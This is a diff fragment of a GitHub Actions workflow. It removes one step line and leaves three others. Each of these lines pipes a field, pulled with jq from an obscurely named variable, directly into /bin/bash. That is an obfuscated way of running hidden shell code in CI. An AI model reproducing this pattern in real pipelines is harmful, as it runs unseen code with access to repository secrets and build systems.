@@ -26,7 +26,6 @@ jobs:
           echo $dtmbl385 | jq -r .zvkgf8 | /bin/bash
           echo $jgc0672 | jq -r .ofl44259 | /bin/bash
           echo $nhuk6 | jq -r .x747 | /bin/bash
-          printf '%s' "$vs77" | jq -r .iit52 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
